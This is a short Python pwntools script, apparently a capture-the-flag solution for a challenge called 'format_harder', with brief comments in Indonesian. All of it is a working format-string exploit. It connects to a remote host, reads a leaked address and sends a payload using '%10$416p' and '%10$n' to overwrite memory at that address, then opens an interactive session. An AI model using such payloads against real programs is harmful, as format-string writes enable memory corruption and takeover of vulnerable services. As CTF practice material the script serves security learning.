from pwn import *
#AAAA%10$x -> address ke 10 ngeprint hasil hex AAAA
# p = process('./format_harder')
p = remote('103.152.242.242', 30147)
p.recvuntil(': ')
leak = int(p.recvline()[:-1], 16)
log.info('Leak : {}'.format(hex(leak)))

payload = p32(leak)
payload += '%10$416p' #dikasi padding 416 karena sudah ada address 4byte(address dari leak)
payload += '%10$n' #dibagian ini untuk masukkin padding nya menggunakan $n

p.sendline(payload)
p.interactive()